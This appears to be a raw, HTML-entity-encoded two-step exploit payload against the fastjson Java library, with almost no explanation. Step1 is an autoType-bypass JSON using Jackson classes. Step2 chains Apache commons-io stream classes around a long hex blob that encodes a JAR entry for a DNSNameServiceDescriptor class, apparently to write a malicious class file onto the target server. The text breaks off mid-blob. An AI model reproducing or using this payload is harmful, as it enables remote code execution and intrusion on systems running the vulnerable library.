Step1:&#123;&quot;a&quot;:&quot;&#123;\\&quot;@type\\&quot;:\\&quot;java.lang.Exception\\&quot;,\\&quot;@type\\&quot;:\\&quot;com.fasterxml.jackson.core.exc.InputCoercionException\\&quot;,\\&quot;p\\&quot;:&#123;&#125;&#125;&quot;,&quot;b&quot;:&#123;&quot;$ref&quot;:&quot;$.a.a&quot;&#125;,&quot;c&quot;:&quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.fasterxml.jackson.core.JsonParser\\&quot;,\\&quot;@type\\&quot;:\\&quot;com.fasterxml.jackson.core.json.UTF8StreamJsonParser\\&quot;,\\&quot;in\\&quot;:&#123;&#125;&#125;&quot;,&quot;d&quot;:&#123;&quot;$ref&quot;:&quot;$.c.c&quot;&#125;&#125;[INFO] Step2:&#123;  &quot;@type&quot;:&quot;java.io.InputStream&quot;,  &quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,  &quot;delegate&quot;:&#123;    &quot;@type&quot;: &quot;org.apache.commons.io.input.AutoCloseInputStream&quot;,    &quot;in&quot;: &#123;      &quot;@type&quot;: &quot;org.apache.commons.io.input.TeeInputStream&quot;,      &quot;input&quot;: &#123;        &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,        &quot;reader&quot;: &#123;           &quot;@type&quot;: &quot;org.apache.commons.io.input.CharSequenceReader&quot;,           &quot;charSequence&quot;: &#123;           &quot;@type&quot;: &quot;java.lang.String&quot;           &quot;\\x50\\x4b\\x03\\x04\\x0a\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x4d\\x2e\\x5a\\x4a\\x10\\x0e\\x00\\x00\\x1a\\x09\\x00\\x00\\x3a\\x00\\x00\\x00\\x73\\x75\\x6e\\x2f\\x6e\\x65\\x74\\x2f\\x73\\x70\\x69\\x2f\\x6e\\x61\\x6d\\x65\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x2f\\x64\\x6e\\x73\\x2f\\x44\\x4e\\x53\\x4e\\x61\\x6d\\x65\\x53\\x65\\x72\\x76\\x69\\x63\\x65\\x44\\x65\\x73\\x63\\x72\\x69\\x70\\x74\\x6f\\x72\\x2e\\x63\\x6c\\x61\\x73\\x73\\x44\\x30\\x55\\x70\\x30\\x49\\x5a\\x55\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x55\\x55\\x35\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x33\\x53\\x55\\x55\\x6e\\x55\\x55\\x55\\x37\\x47\\x4e\\x71\\x64\\x49\\x62\\x65\\x55\\x55\\x55\\x56\\x65\\x31\\x33\\x33\\x57\\x56\\x55\\x45\\x31\\x33\\x33\\x33\\x33\\x33\\x33\\x33\\x33\\x33\\x33\\x33\\x33\\x33\\x73\\x45\\x30\\x73\\x44\\x44\\x55\\x66\\x66\\x58\\x41\\x47\\x7f\\x4b\\x6b\\x38\\x38\\x38\\x52\\x38\\x0d\\x24\\x38\\x44\\x38\\x72\\x30\\x43\\x69\\x75\\x64\\x49\\x62\\x45\\x41\\x74\\x33\\x77\\x57\\x44\\x44\\x74\\x44\\x44\\x44\\x74\\x70\\x44\\x74\\x30\\x77\\x33\\x33\\x33\\x33\\x33\\x33\\x33\\x33\\x73\\x47\\x30\\x33\\x33\\x33\\x33\\x33\\x33\\x73\\x44\\x44\\x66\\x42\\x44\\x4c\\x48\\x7a\\x5c\\x48\\x6a\\x48\\x46\\x5c\\x48\\x66\\x48\\x56\\x5c\\x48\\x76\\x48\\x4e\\x5c\\x48\\x5a\\x48\\x6e\\x74\\x48\\x5e\\x4c\\x48\\x7e\\x4c\\x48\\x41\\x5c\\x48\\x61\\x48\\x51\\x5c\\x48\\x52\\x48\\x71\\x4c\\x48\\x49\\x5c\\x48\\x52\\x48\\x69\\x74\\x48\\x59\\x4c\\x48\\x79\\x4c\\x48\\x45\\x4c\\x48\\x65\\x4c\\x48\\x55\\x5c\\x48\\x75\\x48\\x4d\\x5c\\x48\\x75\\x48\\x6d\\x5c\\x48\\x5d\\x48\\x7d\\x74\\x48\\x43\\x5c\\x48\\x4a\\x48\\x63\\x4c\\x48\\x53\\x5c\\x48\\x4a\\x48\\x73\\x5c\\x48\\x4a\\x48\\x4b\\x5c\\x48\\x74\\x48\\x6b\\x74\\x48\\x5b\\x4c\\x48\\x7b\\x74\\x48\\x47\\x74\\x48\\x67\\x6c\\x48\\x57\\x48\\x77\\x5c\\x48\\x6a\\x48\\x4f\\x5c\\x48\\x6f\\x48\\x5f\\x5c\\x48\\x7f\\x08\\x44\\x30\\x55\\x70\\x30\\x49\\x5a\\x55\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x55\\x55\\x35\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x33\\x53\\x55\\x55\\x6e\\x55\\x55\\x55\\x37\\x43\\x69\\x75\\x64\\x49\\x62\\x45\\x41\\x74\\x33\\x73\\x77\\x57\\x44\\x44\\x44\\x47\\x70\\x74\\x47\\x44\\x44\\x47\\x70\\x44\\x74\\x47\\x47\\x44\\x74\\x77\\x44\\x44\\x44\\x47\\x44\\x44\\x74\\x44\\x47\\x44\\x47\\x74\\x74\\x73\\x47\\x77\\x74\\x74\\x77\\x74\\x77\\x77\\x74\\x74\\x33\\x33\\x33\\x33\\x33\\x77\\x77\\x30\\x33\\x33\\x33\\x33\\x73\\x44\\x66\\x42\\x44\\x75\\x5c\\x48\\x55\\x48\\x4d\\x74\\x48\\x6d\\x5c\\x48\\x45\\x48\\x5d\\x5c\\x48\\x65\\x48\\x7d\\x5c\\x48\\x76\\x48\\x43\\x74\\x48\\x63\\x68\\x48\\x7c\\x47\\x4d\\x7d\\x7d\\x73\\x5b\\x53\\x71\\x4d\\x77\\x4d\\x68\\x48\\x5a\\x69\\x4b\\x4d\\x6f\\x4d\\x5e\\x6b\\x4d\\x5b\\x53\\x5e\\x59\\x77\\x67\\x73\\x5b\\x53\\x7e\\x68\\x48\\x62\\x51\\x7b\\x5b\\x57\\x77\\x4d\\x5b\\x77\\x79\\x4d\\x6b\\x4f\\x43\\x4c\\x48\\x53\\x68\\x48\\x54\\x41\\x73\\x5b\\x73\\x77\\x61\\x68\\x48\\x78\\x4e\\x6e\\x79\\x68\\x48\\x44\\x51\\x7b\\x7d\\x43\\x68\\x48\\x4c\\x57\\x43\\x77\\x51\\x7b\\x7d\\x43\\x7f\\x68\\x48\\x66\\x4e\\x69\\x4b\\x4d\\x6f\\x4d\\x5e\\x6b\\x4d\\x5b\\x53\\x5e\\x59\\x77\\x67\\x73\\x5b\\x53\\x7e\\x6e\\x79\\x68\\x48\\x5c\\x49\\x5f\\x5d\\x43\\x47\\x77\\x73\\x7b\\x5b\\x57\\x68\\x48\\x7c\\x7d\\x43\\x63\\x73\\x5b\\x43\\x5d\\x6b\\x4d\\x57\\x57\\x68\\x48\\x64\\x0e\\x44\\x30\\x55\\x70\\x30\\x49\\x5a\\x55\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x55\\x55\\x35\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x33\\x53\\x55\\x55\\x6e\\x55\\x55\\x55\\x37\\x43\\x69\\x75\\x64\\x49\\x62\\x45\\x41\\x74\\x33\\x77\\x77\\x57\\x47\\x30\\x73\\x74\\x44\\x74\\x77\\x44\\x44\\x77\\x47\\x70\\x44\\x74\\x44\\x47\\x70\\x44\\x44\\x77\\x44\\x47\\x44\\x74\\x44\\x44\\x74\\x77\\x77\\x74\\x33\\x33\\x33\\x33\\x33\\x33\\x33\\x77\\x30\\x33\\x33\\x33\\x33\\x47\\x44\\x44\\x66\\x42\\x44\\x71\\x5e\\x7a\\x51\\x42\\x48\\x66\\x48\\x56\\x68\\x48\\x4a\\x4d\\x49\\x47\\x49\\x66\\x7b\\x5b\\x75\\x5d\\x66\\x5e\\x49\\x6b\\x45\\x6e\\x76\\x42\\x48\\x55\\x48\\x75\\x74\\x48\\x4d\\x42\\x48\\x6d\\x48\\x43\\x74\\x48\\x63\\x42\\x48\\x53\\x48\\x73\\x42\\x48\\x76\\x48\\x4e\\x68\\x48\\x5a\\x4d\\x49\\x47\\x49\\x56\\x5d\\x49\\x43\\x65\\x56\\x7e\\x57\\x59\\x45\\x53\\x5b\\x75\\x63\\x43\\x68\\x48\\x6a\\x4d\\x49\\x47\\x49\\x66\\x5d\\x49\\x43\\x65\\x66\\x41\\x7b\\x43\\x5b\\x75\\x7d\\x45\\x68\\x48\\x74\\x63\\x6b\\x66\\x43\\x49\\x7d\\x45\\x74\\x48\\x4b\\x42\\x48\\x6b\\x48\\x5b\\x42\\x48\\x7b\\x48\\x47\\x68\\x48\\x54\\x67\\x75\\x43\\x79\\x63\\x67\\x42\\x48\\x67\\x48\\x57\\x68\\x48\\x4a\\x4d\\x49\\x47\\x49\\x56\\x5d\\x49\\x43\\x65\\x56\\x61\\x5b\\x4b\\x75\\x43\\x65\\x68\\x48\\x74\\x59\\x7d\\x79\\x66\\x45\\x57\\x45\\x68\\x48\\x58\\x56\\x59\\x68\\x48\\x74\\x56\\x69\\x75\\x43\\x56\\x6b\\x55\\x68\\x48\\x58\\x46\\x59\\x74\\x48\\x77\\x42\\x48\\x4f\\x48\\x6f\\x42\\x48\\x5f\\x48\\x7f\\x74\\x08\\x44\\x30\\x55\\x70\\x30\\x49\\x5a\\x55\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x55\\x55\\x35\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x33\\x53\\x55\\x55\\x6e\\x55\\x55\\x55\\x37\\x43\\x69\\x75\\x64\\x49\\x62\\x45\\x41\\x74\\x33\\x77\\x77\\x57\\x44\\x47\\x30\\x73\\x44\\x44\\x77\\x44\\x47\\x30\\x77\\x77\\x70\\x74\\x44\\x44\\x44\\x47\\x44\\x44\\x44\\x77\\x44\\x44\\x47\\x77\\x77\\x47\\x77\\x74\\x74\\x47\\x74\\x77\\x77\\x44\\x44\\x44\\x74\\x33\\x33\\x33\\x33\\x33\\x33\\x77\\x77\\x77\\x30\\x33\\x33\\x33\\x47\\x64\\x46\\x50\\x63\\x42\\x48\\x53\\x48\\x73\\x68\\x48\\x6a\\x45\\x61\\x43\\x61\\x46\\x7d\\x5d\\x79\\x65\\x46\\x5e\\x51\\x61\\x55\\x55\\x49\\x4d\\x42\\x48\\x7a\\x48\\x4b\\x68\\x48\\x58\\x41\\x56\\x42\\x48\\x6b\\x48\\x5b\\x42\\x48\\x7b\\x48\\x43\\x42\\x48\\x7a\\x48\\x66\\x68\\x48\\x5a\\x45\\x61\\x43\\x61\\x46\\x65\\x61\\x55\\x59\\x46\\x4e\\x65\\x61\\x6d\\x6d\\x6e\\x75\\x61\\x71\\x49\\x4d\\x68\\x48\\x7c\\x71\\x49\\x69\\x79\\x55\\x49\\x4e\\x65\\x61\\x6d\\x6d\\x68\\x48\\x72\\x45\\x61\\x43\\x61\\x46\\x65\\x61\\x55\\x59\\x46\\x4e\\x65\\x61\\x6d\\x6d\\x68\\x48\\x58\\x7e\\x76\\x74\\x48\\x47\\x42\\x48\\x67\\x48\\x57\\x42\\x48\\x77\\x48\\x4f\\x74\\x48\\x6f\\x42\\x48\\x5f\\x48\\x7f\\x74\\x08\\x44\\x30\\x55\\x70\\x30\\x49\\x5a\\x55\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x55\\x55\\x35\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x33\\x53\\x55\\x55\\x6e\\x55\\x55\\x55\\x37\\x43\\x69\\x75\\x64\\x49\\x62\\x45\\x41\\x74\\x73\\x77\\x77\\x57\\x44\\x47\\x30\\x73\\x47\\x74\\x47\\x44\\x44\\x47\\x44\\x74\\x44\\x44\\x44\\x47\\x44\\x44\\x77\\x77\\x44\\x44\\x44\\x74\\x74\\x47\\x44\\x47\\x70\\x44\\x44\\x74\\x73\\x77\\x74\\x77\\x77\\x74\\x77\\x77\\x30\\x73\\x44\\x74\\x73\\x77\\x47\\x30\\x47\\x33\\x33\\x33\\x33\\x33\\x77\\x77\\x47\\x30\\x73\\x44\\x44\\x66\\x42\\x44\\x4b\\x42\\x48\\x6b\\x48\\x5b\\x42\\x48\\x7b\\x48\\x47\\x68\\x48\\x62\\x65\\x41\\x73\\x41\\x6a\\x55\\x41\\x4d\\x59\\x6a\\x5e\\x61\\x65\\x49\\x51\\x63\\x42\\x48\\x67\\x48\\x57\\x42\\x48\\x77\\x48\\x4f\\x42\\x48\\x6f\\x48\\x5f\\x68\\x48\\x5a\\x43\\x53\\x4d\\x6a\\x4d\\x49\\x63\\x6a\\x43\\x5d\\x45\\x6a\\x4d\\x41\\x75\\x49\\x43\\x49\\x7d\\x73\\x45\\x51\\x49\\x6a\\x71\\x4d\\x43\\x6a\\x76\\x6e\\x7e\\x6e\\x41\\x75\\x49\\x7e\\x49\\x7d\\x73\\x45\\x51\\x49\\x76\\x49\\x43\\x51\\x7d\\x45\\x5d\\x63\\x6d\\x7d\\x68\\x48\\x7f\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x46\\x68\\x48\\x74\\x69\\x6d\\x7d\\x6e\\x41\\x75\\x49\\x68\\x48\\x52\\x72\\x4e\\x65\\x41\\x73\\x41\\x6a\\x55\\x41\\x4d\\x59\\x6a\\x7e\\x63\\x7d\\x45\\x4d\\x59\\x7a\\x4a\\x4e\\x65\\x41\\x73\\x41\\x6a\\x55\\x41\\x4d\\x59\\x6a\\x56\\x55\\x41\\x43\\x43\\x7a\\x68\\x48\\x62\\x65\\x41\\x73\\x41\\x6a\\x53\\x63\\x45\\x55\\x6a\\x66\\x41\\x43\\x09\\x44\\x30\\x55\\x70\\x30\\x49\\x5a\\x55\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x55\\x55\\x35\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x33\\x53\\x55\\x55\\x6e\\x55\\x55\\x55\\x37\\x43\\x69\\x75\\x64\\x49\\x62\\x45\\x41\\x74\\x33\\x77\\x77\\x77\\x75\\x74\\x74\\x44\\x77\\x44\\x44\\x44\\x74\\x74\\x74\\x47\\x44\\x44\\x47\\x44\\x74\\x74\\x44\\x44\\x47\\x44\\x44\\x74\\x77\\x44\\x44\\x47\\x74\\x44\\x74\\x44\\x47\\x44\\x44\\x44\\x47\\x44\\x44\\x47\\x77\\x47\\x77\\x77\\x74\\x77\\x77\\x74\\x77\\x77\\x47\\x33\\x33\\x33\\x33\\x33\\x77\\x77\\x47\\x30\\x33\\x33\\x33\\x33\\x73\\x44\\x66\\x42\\x44\\x51\\x61\\x68\\x48\\x5c\\x43\\x7d\\x77\\x59\\x7d\\x6d\\x7b\\x5d\\x7d\\x67\\x68\\x48\\x74\\x59\\x7d\\x6d\\x7b\\x5d\\x7d\\x67\\x68\\x48\\x42\\x79\\x5b\\x5b\\x7d\\x67\\x69\\x4b\\x4d\\x57\\x57\\x7d\\x57\\x68\\x48\\x76\\x5e\\x7e\\x45\\x73\\x4d\\x6f\\x4d\\x41\\x4f\\x77\\x53\\x4b\\x41\\x49\\x4d\\x57\\x7d\\x51\\x61\\x4e\\x59\\x7d\\x6d\\x7b\\x5d\\x7d\\x67\\x71\\x68\\x48\\x66\\x73\\x4d\\x6f\\x4d\\x41\\x4f\\x77\\x53\\x4b\\x41\\x49\\x4d\\x57\\x7d\\x51\\x61\\x4e\\x59\\x7d\\x6d\\x7b\\x5d\\x7d\\x67\\x68\\x48\\x54\\x5d\\x7d\\x6d\\x7b\\x5d\\x7d\\x68\\x48\\x46\\x5e\\x45\\x73\\x4d\\x6f\\x4d\\x41\\x4b\\x4d\\x5b\\x43\\x41\\x55\\x77\\x67\\x53\\x5b\\x43\\x71\\x7e\\x75\\x49\\x68\\x48\\x4a\\x73\\x4d\\x6f\\x4d\\x41\\x4b\\x4d\\x5b\\x43\\x41\\x55\\x7f\\x57\\x77\\x7d\\x6b\\x68\\x48\\x7c\\x43\\x7d\\x77\\x65\\x67\\x7b\\x47\\x7d\\x67\\x77\\x7f\\x68\\x48\\x6e\\x5e\\x45\\x73\\x4d\\x6f\\x4d\\x41\\x4b\\x4d\\x5b\\x43\\x41\\x55\\x77\\x67\\x53\\x5b\\x43\\x71\\x7e\\x45\\x73\\x4d\\x6f\\x4d\\x41\\x4b\\x4d\\x5b\\x43\\x41\\x55\\x77\\x67\\x53\\x5b\\x43\\x71\\x68\\x48\\x7c\\x77\\x7b\\x45\\x7b\\x5f\\x7d\\x67\\x69\\x4d\\x57\\x7d\\x68\\x48\\x7a\\x5e\\x7e\\x45\\x73\\x4d\\x6f\\x4d\\x41\\x4b\\x4d\\x5b\\x43\\x41\\x55\\x77\\x67\\x53\\x5b\\x43\\x71\\x68\\x48\\x4c\\x6d\\x7b\\x5b\\x77\\x4d\\x53\\x5b\\x57\\x68\\x48\\x56\\x5e\\x45\\x73\\x4d\\x6f\\x4d\\x41\\x4b\\x4d\\x5b\\x43\\x41\\x69\\x63\\x4d\\x67\\x55\\x3d\\x44\\x30\\x55\\x70\\x30\\x49\\x5a\\x55\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x55\\x55\\x35\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x33\\x53\\x55\\x55\\x6e\\x55\\x55\\x55\\x37\\x43\\x69\\x75\\x64\\x49\\x62\\x45\\x41\\x74\\x33\\x77\\x57\\x47\\x44\\x47\\x77\\x30\\x47\\x77\\x47\\x44\\x44\\x47\\x70\\x44\\x74\\x44\\x44\\x47\\x74\\x77\\x44\\x74\\x44\\x77\\x44\\x47\\x77\\x47\\x47\\x74\\x77\\x44\\x44\\x74\\x74\\x77\\x74\\x77\\x47\\x73\\x77\\x77\\x74\\x33\\x33\\x33\\x33\\x33\\x77\\x77\\x30\\x33\\x33\\x33\\x33\\x73\\x44\\x44\\x66\\x42\\x44\\x67\\x6f\\x7d\\x5b\\x6d\\x7d\\x4e\\x56\\x55\\x68\\x48\\x4a\\x73\\x4d\\x5f\\x4d\\x76\\x4b\\x4d\\x5b\\x43\\x76\\x69\\x6f\\x5b\\x4f\\x53\\x6b\\x7d\\x68\\x48\\x5c\\x43\\x7d\\x4f\\x69\\x6f\\x5b\\x4f\\x53\\x6b\\x7d\\x68\\x48\\x6a\\x66\\x56\\x51\\x73\\x4d\\x5f\\x4d\\x76\\x4b\\x4d\\x5b\\x43\\x76\\x69\\x6f\\x5b\\x4f\\x53\\x6b\\x7d\\x4e\\x68\\x48\\x44\\x7d\\x7f\\x7d\\x6d\\x68\\x48\\x66\\x66\\x75\\x51\\x73\\x4d\\x5f\\x4d\\x76\\x4b\\x4d\\x5b\\x43\\x76\\x59\\x4f\\x57\\x53\\x5b\\x43\\x4e\\x56\\x51\\x73\\x4d\\x5f\\x4d\\x76\\x4b\\x4d\\x5b\\x43\\x76\\x49\\x57\\x7b\\x6d\\x7d\\x77\\x77\\x4e\\x68\\x48\\x4a\\x73\\x4d\\x5f\\x4d\\x76\\x4b\\x4d\\x5b\\x43\\x76\\x49\\x57\\x7b\\x6d\\x7d\\x77\\x77\\x68\\x48\\x52\\x43\\x7d\\x4f\\x61\\x5b\\x47\\x6f\\x4f\\x59\\x4f\\x57\\x7d\\x4d\\x6b\\x68\\x48\\x5a\\x66\\x56\\x51\\x73\\x4d\\x5f\\x4d\\x76\\x53\\x7b\\x76\\x61\\x5b\\x47\\x6f\\x4f\\x59\\x4f\\x57\\x7d\\x4d\\x6b\\x4e\\x68\\x48\\x7a\\x66\\x51\\x73\\x4d\\x5f\\x4d\\x76\\x53\\x7b\\x76\\x61\\x5b\\x47\\x6f\\x4f\\x59\\x4f\\x57\\x7d\\x4d\\x6b\\x4e\\x56\\x45\\x68\\x48\\x42\\x6f\\x77\\x7d\\x7e\\x7d\\x4b\\x53\\x6b\\x53\\x4f\\x7d\\x57\\x68\\x48\\x46\\x66\\x51\\x73\\x4d\\x5f\\x4d\\x76\\x4b\\x4d\\x5b\\x43\\x76\\x59\\x4f\\x57\\x53\\x5b\\x43\\x4e\\x56\\x51\\x73\\x4d\\x5f\\x4d\\x76\\x6f\\x4f\\x53\\x4b\\x76\\x59\\x6d\\x4d\\x5b\\x5b\\x7d\\x57\\x4e\\x68\\x48\\x44\\x5b\\x7d\\x7f\\x4f\\x68\\x48\\x4a\\x73\\x4d\\x5f\\x4d\\x76\\x4b\\x4d\\x5b\\x43\\x76\\x61\\x5b\\x4f\\x7d\\x43\\x7d\\x57\\x68\\x48\\x44\\x79\\x65\\x49\\x41\\x68\\x48\\x4a\\x51\\x73\\x4d\\x5f\\x4d\\x76\\x4b\\x4d\\x5b\\x43\\x76\\x5e\\x4b\\x4d\\x77\\x77\\x4e\\x68\\x48\\x4a\\x43\\x7d\\x4f\\x7e\\x7d\\x6d\\x4b\\x4d\\x57\\x7d\\x5d\\x71\\x7d\\x4f\\x63\\x7b\\x5d\\x68\\x48\\x6e\\x66\\x51\\x73\\x4d\\x5f\\x4d\\x76\\x4b\\x4d\\x5b\\x43\\x76\\x59\\x4f\\x57\\x53\\x5b\\x43\\x4e\\x75\\x51\\x73\\x4d\\x5f\\x4d\\x76\\x4b\\x4d\\x5b\\x43\\x76\\x5e\\x4b\\x4d\\x77\\x77\\x4e\\x56\\x51\\x73\\x4d\\x5f\\x4d\\x76\\x4b\\x4d\\x5b\\x43\\x76\\x57\\x3d\\x44\\x30\\x55\\x70\\x30\\x49\\x5a\\x55\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x55\\x55\\x35\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x33\\x53\\x55\\x55\\x6e\\x55\\x55\\x55\\x37\\x43\\x69\\x75\\x64\\x49\\x62\\x45\\x41\\x74\\x33\\x77\\x77\\x57\\x74\\x77\\x74\\x47\\x44\\x44\\x44\\x47\\x44\\x44\\x74\\x47\\x44\\x44\\x47\\x70\\x74\\x74\\x44\\x44\\x74\\x74\\x44\\x44\\x74\\x44\\x77\\x74\\x44\\x44\\x47\\x47\\x44\\x77\\x44\\x44\\x74\\x73\\x77\\x77\\x74\\x47\\x74\\x33\\x33\\x33\\x33\\x33\\x73\\x77\\x47\\x30\\x33\\x33\\x33\\x33\\x73\\x44\\x64\\x46\\x50\\x43\\x5b\\x7d\\x6d\\x77\\x5e\\x69\\x7d\\x77\\x53\\x47\\x5d\\x41\\x68\\x48\\x66\\x4b\\x75\\x6f\\x75\\x5e\\x5b\\x75\\x7b\\x63\\x5e\\x67\\x7d\\x43\\x5b\\x7d\\x6d\\x77\\x5e\\x69\\x7d\\x77\\x53\\x47\\x5d\\x68\\x48\\x62\\x57\\x7d\\x77\\x61\\x6d\\x6d\\x7d\\x57\\x57\\x73\\x4d\\x5b\\x7d\\x68\\x48\\x44\\x4e\\x65\\x6e\\x45\\x68\\x48\\x4a\\x4b\\x75\\x6f\\x75\\x5e\\x5b\\x75\\x7b\\x63\\x5e\\x79\\x53\\x67\\x7d\\x75\\x5d\\x68\\x48\\x62\\x6d\\x4f\\x67\\x67\\x7d\\x7b\\x77\\x79\\x53\\x67\\x7d\\x75\\x5d\\x68\\x48\\x5a\\x4e\\x6e\\x49\\x4b\\x75\\x6f\\x75\\x5e\\x5b\\x75\\x7b\\x63\\x5e\\x79\\x53\\x67\\x7d\\x75\\x5d\\x41\\x68\\x48\\x7a\\x63\\x7d\\x77\\x51\\x47\\x7b\\x77\\x7d\\x7f\\x77\\x51\\x5b\\x75\\x57\\x57\\x49\\x47\\x75\\x5d\\x7d\\x67\\x68\\x48\\x56\\x4e\\x6e\\x49\\x4b\\x75\\x6f\\x75\\x5e\\x5b\\x75\\x7b\\x63\\x5e\\x51\\x5b\\x75\\x57\\x57\\x49\\x47\\x75\\x5d\\x7d\\x67\\x41\\x68\\x48\\x74\\x6f\\x75\\x5b\\x4f\\x7d\\x59\\x43\\x68\\x48\\x46\\x4e\\x71\\x6e\\x49\\x4b\\x75\\x6f\\x75\\x5e\\x5b\\x75\\x7b\\x63\\x5e\\x71\\x7b\\x77\\x7d\\x63\\x7d\\x67\\x41\\x68\\x48\\x54\\x73\\x7b\\x6f\\x47\\x6b\\x7d\\x68\\x48\\x7e\\x4e\\x49\\x4b\\x75\\x6f\\x75\\x5e\\x5b\\x75\\x7b\\x63\\x5e\\x59\\x4d\\x4b\\x7d\\x6d\\x77\\x41\\x55\\x49\\x4b\\x75\\x6f\\x75\\x5e\\x5b\\x75\\x7b\\x63\\x5e\\x59\\x4d\\x4b\\x7d\\x6d\\x77\\x41\\x6e\\x49\\x4b\\x75\\x6f\\x75\\x5e\\x5b\\x75\\x7b\\x63\\x5e\\x59\\x4d\\x4b\\x7d\\x6d\\x77\\x41\\x68\\x48\\x7c\\x7b\\x7d\\x5f\\x71\\x7b\\x57\\x77\\x75\\x7b\\x6d\\x7d\\x68\\x48\\x5a\\x4e\\x6e\\x49\\x4b\\x75\\x6f\\x75\\x5e\\x5b\\x75\\x7b\\x63\\x5e\\x59\\x4d\\x4b\\x7d\\x6d\\x77\\x41\\x48\\x76\\x48\\x6e\\x48\\x74\\x48\\x48\\x48\\x68\\x08\\x44\\x30\\x55\\x70\\x30\\x49\\x5a\\x55\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x55\\x55\\x35\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x33\\x53\\x55\\x55\\x6e\\x55\\x55\\x55\\x37\\x43\\x69\\x75\\x64\\x49\\x62\\x45\\x41\\x74\\x33\\x33\\x73\\x77\\x45\\x44\\x44\\x44\\x73\\x77\\x44\\x44\\x44\\x74\\x30\\x47\\x44\\x44\\x77\\x44\\x44\\x47\\x44\\x47\\x47\\x30\\x47\\x44\\x47\\x30\\x47\\x44\\x74\\x30\\x73\\x47\\x44\\x44\\x74\\x30\\x77\\x70\\x44\\x47\\x44\\x74\\x77\\x44\\x47\\x33\\x33\\x33\\x33\\x33\\x77\\x77\\x47\\x64\\x46\\x50\\x5e\\x48\\x59\\x48\\x79\\x48\\x68\\x48\\x45\\x48\\x48\\x48\\x58\\x48\\x65\\x48\\x78\\x48\\x68\\x48\\x55\\x48\\x75\\x48\\x68\\x48\\x4d\\x48\\x48\\x48\\x6a\\x48\\x68\\x48\\x68\\x48\\x48\\x48\\x64\\x59\\x4f\\x48\\x68\\x57\\x48\\x48\\x48\\x48\\x48\\x68\\x48\\x6d\\x48\\x5d\\x48\\x58\\x48\\x4d\\x48\\x48\\x48\\x7b\\x48\\x44\\x48\\x54\\x48\\x48\\x48\\x5b\\x5a\\x58\\x6f\\x48\\x78\\x73\\x6f\\x48\\x44\\x79\\x77\\x48\\x64\\x43\\x45\\x6f\\x48\\x54\\x67\\x48\\x6b\\x43\\x5a\\x4c\\x6f\\x48\\x78\\x73\\x5a\\x6c\\x6f\\x48\\x5c\\x77\\x48\\x7c\\x5a\\x42\\x77\\x48\\x62\\x47\\x48\\x4e\\x54\\x7f\\x48\\x52\\x4b\\x78\\x5a\\x72\\x53\\x4b\\x44\\x5a\\x4a\\x53\\x4b\\x64\\x79\\x53\\x67\\x48\\x66\\x54\\x7f\\x48\\x52\\x4b\\x78\\x5a\\x6a\\x53\\x4b\\x44\\x5a\\x5a\\x53\\x4b\\x64\\x79\\x53\\x63\\x6f\\x48\\x7a\\x65\\x77\\x48\\x46\\x77\\